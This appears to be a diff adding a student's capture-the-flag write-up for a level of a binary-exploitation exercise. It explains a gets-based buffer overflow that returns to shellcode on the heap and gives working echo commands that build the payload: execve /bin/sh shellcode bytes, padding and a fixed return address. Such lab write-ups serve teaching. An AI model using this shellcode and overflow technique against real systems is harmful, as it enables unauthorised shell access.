@@ -6,7 +6,36 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:52:12 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/04 18:53:01 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/06 03:50:12 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
+Like the previous level, the executable uses 'gets'
+
+It also segfaults if more than 76 characters are written,
+but we need to write 80 characters of padding to reach the return address
+
+However, we can't point the return address to the stack,
+due to a check leading to an exit
+
+This prevents a shellcode stored on the stack or in environment variables
+
+However the executable uses strdup on the input
+
+This allows us to store a shellcode on the heap
+
+Malloc always return the address 0x804a008 , due to the lack of ASLR
+
+We simply write a shellcode in the input prompt,
+pad so we overflow to the stack,
+then write the allocated address on the return address
+
+
+# 25 characters
+echo -e -n "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" > /tmp/l2
+# 55 characters
+echo -e -n "-------------------------------------------------------" >> /tmp/l2
+# Return address
+echo -e -n "\x08\xa0\x04\x08" >> /tmp/l2
+# Launch exploit
+cat /tmp/l2 - | ./level2
